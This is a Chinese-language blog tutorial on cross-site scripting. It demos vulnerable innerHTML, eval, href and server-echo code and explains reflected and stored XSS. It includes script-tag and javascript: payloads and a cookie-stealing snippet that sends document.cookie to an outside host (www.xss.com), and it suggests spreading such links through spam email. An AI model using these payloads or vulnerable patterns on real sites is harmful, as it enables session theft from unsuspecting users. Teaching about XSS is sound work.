xss攻击笔记

发表于 2017-10-11
字数统计 2,813 | 阅读时长 11

一，xss攻击初探

今天要分享的是XSS：跨站脚本攻击(Cross Site Scripting)，聊起攻击，首先要明白在前端领域，什么才是有效的攻击。

既然如此，就让我们尝试攻击一下平时我们写的页面


1，第一次尝试攻击

例：我们有上图这样一个采集用户名的输入框

<body>
  <div class="lead">
    您输入的用户名为：
    <span id="name">
    </span>
  </div>
  <input class="col-sm-3 form-control" type="text" id="text"/>
  <button class="btn btn-default" type="submit">提交</button>
</body>

html代码如上图：

let btn = document.querySelector("button");
let input = document.querySelector("#text");
let span = document.querySelector("#name");

btn.onclick = ()=>{
  let value = input.value;
  span.innerHTML = value;
}

js代码如上图：

  • demo的功能为：

（1）点击“提交”按钮，采集input输入框输入的内容

（2）将采集到的信息，展示到上面的span标签中

现在我们尝试输入内容：

1，输入内容123，
2，点击提交
3，span中也展示了123

可以看到我们输入什么，点击提交之后，就会放到span当中


2，存在的问题

注意： 如果我们输入 script>alert(1)</script” 标签的话,这岂不是就 出大事了！

既然如此，我们测试一下

1，在input中输入了<script>alert(1);</script>
2, 点击提交
3，然而span中并没内容，而且alert也没有执行

然而，alert并没有如预期一样被执行，那么检查一下我们的html

可以看到script标签已经成功被添加到了span标签内。

而alert没有执行，是因为w3c规范innerHTML这个api插入的script标签不会被执行


3，第二次尝试攻击

想一想，还有没其他途径来攻击呢？

前面，通过js获取了input输入的内容，那么如果，在js中出现了问题呢？

例如：输入eval(alert(1))

当js获取到input的value时候，是否会出现问题？

如上图，这当然是不可能成功的，输入的内容，被当做字符串展示在了span标签当中。

因为，获取input的value值是字符串，自然不能被执行。

想要让js执行输入的字符串，需要使用eval才可以。

let btn = document.querySelector("button");
let input = document.querySelector("#text");
let span = document.querySelector("#name");

btn.onclick = ()=>{
  let value = input.value;
  eval(value);
  span.innerHTML = value;
}

修改，在js中添加eval方法。

这样的话，alert就可以在js环节执行了

但eval这个方法，本身就不被推荐使用，所以这种低级的场景应该很少。


4，第一小节总结

1，通过innerHTML方式注入script的方式，失败
2，突破js的方案，失败
3，eval方法，成功

可以看出，不是很系统了解过xss攻击的人，其实很难形成有效的攻击，毕竟w3c和ECMA委员会也不是吃干饭的，常见的基础型漏洞，都已经被修复的很完美。

二，xss攻击入门

前面的尝试，基本都以失败告终。

现在开始尝试真正的攻击：

1，href攻击

业务场景中，经常有这样一种情况，就是采集到数据后，拼接在href上，用于带到下一个页面，进行数据传递。

例如：当前需求为

1，获取用户信息
2，添加到href的位置

html+js代码如下：

<body>
  <div class="lead">
    您输入的用户名为：
    <a id="name" href="a.html">a标签跳转</a>
    </span>
  </div>
  <input class="col-sm-3 form-control" type="text" id="text"/>
  <button class="btn btn-default" type="submit">提交</button>
</body>

<script>
    let btn = document.querySelector("button");
    let input = document.querySelector("#text");
    let a = document.querySelector("#name");

    btn.onclick = ()=>{
      let value = input.value;
      a.href = value;
    }
</script>

此时输入javascript:alert(1),然后点击提交，可以看到a标签href的变化

此时点击a标签，即发现alert成功弹出了

虽然攻击成功了，但当前的场景也并不多见。

2，href攻击增强

业务中，经常会遇到搜索的需求。

例：将搜索的内容传递给服务器，服务器根据搜索的内容，返回响应的页面内容。

现在修改一下之前的代码

<body>
    <input class="col-sm-3 form-control" type="text" id="text"/>
    <button class="btn btn-default" type="submit">提交</button>
</body>
<script>
    let btn = document.querySelector("button");
    let input = document.querySelector("#text");
    let a = document.querySelector("#name");

    btn.onclick = ()=>{
      let value = input.value;
      location.href = '/users?search='+value;
    }
</script>

现在我们的html只有一个input输入和一个button提交

而js的功能则是将input输入的内容，拼接在链接中

此时我们输入一些带有攻击性的内容，点击提交

http://localhost:3000/users?search=%3Cscript%3Edocument.write(1)%3C/script%3E

此时，页面进行了跳转，并将有危险的代码拼接在了url上

该请求发送到了服务器上，例如下面是服务器对应的处理逻辑：

router.get('/users', function (ctx, next) {
  ctx.body = "<div>"+ctx.query.search+"</div>";
})

1，服务器匹配了users路由，并执行了对应的处理逻辑

2，处理逻辑中，提取了请求传入的search字段参数，返回给了前端。

ok，可以看到服务器没有任何处理，这样的话，我们的script代码便会被返回给浏览器，因为没有使用innerHTMLapi，所以浏览器会正常的解析。

但是…攻击真的会成功吗？

那么我们测试一下

此时url为：

http://localhost:3000/users?search=%3Cscript%3Edocument.write(1)%3C/script%3E

chrome显示：

可以看到攻击被拦截了！

但是从chrome返回的内容，可以得出几个结论：

1，攻击成功了，触发了chrome的防御功能。
2，浏览器早已发现了这个问题，所以已经有了解决方案。
3，虽然攻击被防御了，但至少证明了，这确实是一种有攻击力的攻击方式。

毕竟chrome是浏览器行业的领头羊，有解决方案也不意外。
但是其他的浏览器呢？
如果有其他浏览器存在这个漏洞呢？

经测试！！！

pc端的现代浏览器，都有防御方案，不会出现上述问题。

还有没有其他机会？

既然pc端不可以，那么移动端呢，毕竟移动端是基于webview的，webview毕竟是阉割版，会不会有问题呢？

那么测试一下，移动端uc，chrome，360等，经测试，攻击无效！！

虽然攻击无效，但是各移动端浏览器，都没有友善的提示信息，全都是白屏。

其实这个证明不了什么，只能说明web端的浏览器确实是阉割版。

难道真的没有可能吗？

其实在移动端，对主流浏览器测试，肯定没有问题，毕竟浏览器厂商也不是吃干饭的。

但如果不是各大浏览器呢，而是原生的webview呢？

例如各种app中嵌入的h5呢

这里测试了一个ios应用，使用的是原生的webview，调用的是最普通的浏览器内核，同样是上面的攻击方式。

可以看到，页面中输出了一个1！

这说明：

1，原生webview确实存在漏洞
2，移动端各主流浏览器，或者使用了非原生内核（腾讯x5），或者添加了防御机制。
3，很多ios或者android开发者无法意识到这一点。

3，攻击之后呢？

前面，已经成功将我们所写的js注入到了页面当中。

既然这样的话，我们就能干很多事情了，例如：

<script>
     var img = new Image();
    img.src = "http://www.xss.com/getcookie?cookie=" + document.cookie;
    document.body.append(img);
</script>

如上，就是通过漏洞注入script代码，获取cookie并发送到远程服务器

上面这种向代码中添加script脚本的方式，其实就是XSS

三，xss攻击晋级

1，demo存在的问题

前面的例子，其实还存在问题：

1，当前操作人，是开发者||黑客自身
2，获取的cookie也还是自己的

这其实是没什么意义的，如果是开发者或黑客自己，给自己注入js，本身就是个无聊的行为。

与其这样，还不如用fiddler代理一下文件，不就有了新的js嘛。

其实，攻击的目的，肯定不是自己瞎折腾，而是想要将攻击以病毒的方式的扩散出去。

前面，我们不是有个链接嘛：

http://localhost:3000/users?search=
<script>
    var img = new Image();
    img.src = "http://www.xss.com/getcookie?cookie=" + document.cookie;
    document.body.append(img);
<script>

现在这个链接的xss漏洞已经被我们确认存在了，并且在移动端进入该页面的话，就会执行相应的脚本，盗取cookie

既然如此，我们可以换一个角度。

1，将这个链接扩散出去
2，想办法，让登陆过这个网站的人，点击这个链接，并进入该页面

这种攻击，即符合同源策略，也比较容易实现。

最常见的，就是qq邮箱中的各种垃圾邮件。

例如：

1，邮件中包含了一个链接。
2，如果这个链接是拼接好的baidu的某个xss攻击链接。
3，当点击之后，进入百度的某个页面。
4，xss脚本执行，获取了百度账号的cookie，发送到了远程服务器。

2，xss分类

ok，前面我们已经了解过了一种xss攻击方式，就是生成一个链接，让其他人去点击。

存在的问题：

毕竟还是要生成链接，而且扩散费劲，还需要用户手动点击，总的来说不够理想。

那么有没有更快捷的攻击方式。

回顾一下，前面的攻击流程：

1，search中输入攻击代码，发送到服务器
2，服务器将攻击代码返回给客户端
3，客户端解析

前面的攻击之所以能够成功，有一个关键点，就是：

“客户端解析”

只要被客户端成功解析，就能够成功攻击。

经过第一节，我们清楚，前端一个人不通过服务器，在前端折腾，其实比较难造成有效的攻击。

而从服务器返回的攻击代码却很容易被浏览器解析。

既然这样，我们就明确了一个方向：

“攻击的代码最好是从服务器吐出来的”

既然如此，那如果我们的攻击代码，就存储在数据库里，岂不是最好。

没错，很多富文本编辑功能的应用就存在这个问题，例如：

这是一个晴朗的午后,<script>alert(1)</script>

1，上面的文本，被当作文章保存到数据库。
2，展示给其他用户观看。
3，凡是观看到的用户，都会被攻击

两种常见的工具方式都已经了解过了

其中，第一种通过生成链接的方式进行攻击，叫做：

“反射型xss”

反射型，可以简单理解成，给服务器发什么，服务器就返回什么，就像小学生打王者，骂不过的一句“反弹”

而，第二种富文本夹带攻击代码的方式，叫做：

“存储型xss”

存储型，主要是攻击代码已经被保存到服务器，所有用户都能够被攻击，危害比反射型要高，主要体现在博客论坛等。
